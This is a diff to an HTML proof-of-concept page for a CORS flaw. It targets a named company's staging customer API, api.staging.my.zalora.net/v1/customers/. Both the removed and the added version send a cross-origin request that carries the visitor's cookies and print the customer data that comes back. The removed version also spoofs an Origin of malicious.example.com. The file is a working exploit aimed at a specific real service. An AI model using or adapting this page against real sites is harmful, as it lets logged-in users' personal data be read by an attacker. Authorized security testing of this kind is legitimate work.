@@ -1,36 +1,37 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CORS Vulnerability PoC</title>
-</head>
-<body>
-    <h2>CORS Vulnerability Exploit PoC</h2>
-    <button onclick="exploit()">Send Exploit Request</button>
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS PoC</title>
     <script>
-        function exploit() {
-            // URL of the vulnerable endpoint
-            const url = "https://api.staging.my.zalora.net/v1/customers/";
+        function makeCorsRequest() {
+            var xhttp = new XMLHttpRequest();
+            // Change this URL to the vulnerable API endpoint
+            var url = "https://api.staging.my.zalora.net/v1/customers/";
 
-            // Send a cross-origin request with credentials (cookies)
-            fetch(url, {
-                method: "GET",
-                credentials: "include", // Include cookies
-                headers: {
-                    "Accept": "application/json",
-                    "Origin": "https://malicious.example.com"  // A domain different from the target
+            xhttp.open("GET", url, true);
+            xhttp.withCredentials = true; // Important for sending cookies
+
+            xhttp.onload = function () {
+                if (xhttp.status >= 200 && xhttp.status < 300) {
+                    document.getElementById("response").textContent = "Response: " + xhttp.responseText;
+                } else {
+                    document.getElementById("response").textContent = "Request failed with status: " + xhttp.status;
                 }
-            })
-            .then(response => response.text())
-            .then(data => {
-                // Display or log the captured response data
-                console.log("Response:", data);
-                document.body.innerHTML += `<pre>Response Data: ${data}</pre>`;
-            })
-            .catch(error => {
-                console.error("Error:", error);
-            });
+            };
+
+            xhttp.onerror = function () {
+                document.getElementById("response").textContent = "Request failed";
+            };
+
+            xhttp.send();
         }
     </script>
+</head>
+<body>
+    <h1>CORS PoC</h1>
+    <button onclick="makeCorsRequest()">Make CORS Request</button>
+    <pre id="response"></pre>
 </body>
 </html>
